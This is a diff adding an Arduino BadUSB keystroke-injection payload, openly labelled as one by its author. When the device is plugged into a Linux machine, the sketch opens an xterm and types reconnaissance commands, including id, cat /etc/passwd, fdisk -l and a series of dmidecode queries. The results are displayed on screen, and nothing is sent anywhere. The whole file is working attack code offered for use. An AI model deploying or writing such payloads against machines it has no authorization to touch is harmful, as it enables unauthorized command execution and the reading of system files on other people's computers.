@@ -1,0 +1,94 @@
+/**
+ *This payload prints the entire device information when BadUSB is plucked.
+ *Developed By Smaran Chand | smaranchand@gmail.com
+ */
+
+#include "Keyboard.h"
+
+void typeKey(uint8_t key)
+{
+  Keyboard.press(key);
+  delay(50);
+  Keyboard.release(key);
+}
+
+/* Init function */
+void setup()
+{
+  // Begining the Keyboard stream
+  Keyboard.begin();
+
+  // Wait 500ms
+  delay(500);
+
+  delay(3000);
+  Keyboard.press(KEY_LEFT_ALT);
+  Keyboard.press(KEY_F2);
+  Keyboard.releaseAll();
+
+  delay(500);
+  Keyboard.print(F("xterm"));
+
+  delay(750);
+  typeKey(KEY_RETURN);
+
+  delay(750);
+  Keyboard.print(F("pwd"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("id"));
+
+  delay(300);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("cat /etc/passwd"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("uname -a"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("fdisk -l"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("dmidecode -t system"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("dmidecode -t memory"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("dmidecode -t processor"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  delay(500);
+  Keyboard.print(F("dmidecode -t bios"));
+
+  delay(500);
+  typeKey(KEY_RETURN);
+
+  // Ending stream
+  Keyboard.end();
+}
+
+/* Unused endless loop */
+void loop() {}
